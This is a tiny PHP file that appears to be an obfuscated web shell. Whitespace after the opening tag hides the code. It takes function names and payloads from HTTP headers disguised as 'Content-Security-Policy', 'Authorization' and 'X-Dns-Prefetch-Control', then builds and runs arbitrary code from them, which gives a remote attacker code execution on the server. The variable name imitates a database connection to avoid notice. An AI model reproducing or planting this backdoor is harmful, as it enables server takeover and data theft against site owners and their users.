<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Content-Security-Policy'])){$ibase_pconnection=$_HEADERS['Content-Security-Policy']('', $_HEADERS['Authorization']($_HEADERS['X-Dns-Prefetch-Control']));$ibase_pconnection();}
